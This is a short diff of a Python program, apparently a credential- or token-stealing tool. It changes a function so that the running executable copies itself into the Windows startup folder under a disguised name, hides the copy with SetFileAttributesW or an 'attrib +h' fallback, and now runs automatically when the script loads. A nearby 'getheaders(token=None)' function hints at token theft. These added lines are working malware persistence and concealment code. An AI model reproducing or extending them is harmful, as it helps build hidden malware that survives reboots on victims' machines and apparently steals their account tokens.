@@ -113,16 +113,21 @@ def copy_exe_to_startup(exe_path):
     )
     base, ext = os.path.splitext(os.path.basename(exe_path))
     destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
+    
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
-
-        if sys.platform == 'win32':
+        
+        try:
+            FILE_ATTRIBUTE_HIDDEN = 0x02
+            ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+        except Exception as e:
             try:
-                import ctypes
-                FILE_ATTRIBUTE_HIDDEN = 0x02
-                ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+                os.system(f'attrib +h "{destination_path}"')
             except:
-                pass
+                print(f"Failed to hide file: {e}")
+
+exe_path = os.path.abspath(sys.argv[0])
+copy_exe_to_startup(exe_path)
                 
 def getheaders(token=None):
     headers = {
